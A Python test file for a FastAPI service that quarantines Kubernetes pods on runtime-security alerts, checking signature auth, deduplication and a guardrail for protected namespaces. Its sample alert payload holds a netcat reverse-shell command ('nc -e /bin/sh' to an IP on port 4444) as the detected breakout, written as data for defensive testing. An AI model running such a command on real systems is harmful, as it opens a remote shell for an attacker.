import hashlib
import hmac
import json
import os

# Set dry-run mode before importing main
os.environ["ZTRE_DRY_RUN"] = "true"
os.environ["ZTRE_WEBHOOK_SECRET"] = "test-secret"
os.environ["GEMINI_API_KEY"] = ""

from fastapi.testclient import TestClient
from main import app

client = TestClient(app)


def sign(payload_bytes: bytes, secret: str = "test-secret") -> str:
    sig = hmac.new(secret.encode(), payload_bytes, hashlib.sha256).hexdigest()
    return f"sha256={sig}"


def make_payload(namespace="modernized-app", pod_name="app-1", uid="uid-1"):
    return {
        "event_id": "evt-001",
        "timestamp": "2026-11-21T09:00:00Z",
        "policy_name": "detect-container-breakout",
        "workload": {
            "namespace": namespace,
            "pod_name": pod_name,
            "uid": uid,
            "labels": {"app": "modernized-app"},
        },
        "process": {
            "binary": "/bin/sh",
            "arguments": "-c 'nc -e /bin/sh 198.51.100.1 4444'",
            "parent_binary": "/usr/local/bin/php-fpm",
            "pid": 1234,
        },
    }


def test_healthz():
    resp = client.get("/healthz")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "healthy"
    assert data["dry_run"] is True


def test_auth_rejection():
    payload = json.dumps(make_payload()).encode()
    # Missing header
    resp = client.post("/v1/remediate", content=payload)
    assert resp.status_code == 401

    # Invalid signature
    resp = client.post(
        "/v1/remediate",
        content=payload,
        headers={"X-ZTRE-Signature": "sha256=invalid"},
    )
    assert resp.status_code == 401


def test_quarantine_and_deduplication():
    payload_dict = make_payload(uid="unique-uid-99")
    payload = json.dumps(payload_dict).encode()
    headers = {"X-ZTRE-Signature": sign(payload)}

    # 1. Fresh alert -> Quarantined
    resp = client.post("/v1/remediate", content=payload, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "quarantined"
    audit = data["audit_record"]
    assert audit["mode"] == "DRY_RUN"
    assert audit["applied_label"] == "ztre.io/status=quarantined"
    assert audit["network_policy"] == "ztre-zero-trust-quarantine"
    assert "[Deterministic Triage]" in audit["forensic_summary"]

    # 2. Duplicate alert (same UID) -> Deduplicated
    resp_dup = client.post("/v1/remediate", content=payload, headers=headers)
    assert resp_dup.status_code == 200
    assert resp_dup.json()["status"] == "deduplicated"


def test_protected_namespace_guardrail():
    payload_dict = make_payload(namespace="kube-system", uid="sys-uid-01")
    payload = json.dumps(payload_dict).encode()
    headers = {"X-ZTRE-Signature": sign(payload)}

    resp = client.post("/v1/remediate", content=payload, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "ignored"
    assert data["reason"] == "protected_namespace"


if __name__ == "__main__":
    test_healthz()
    test_auth_rejection()
    test_quarantine_and_deduplication()
    test_protected_namespace_guardrail()
    print("All tests passed successfully.")
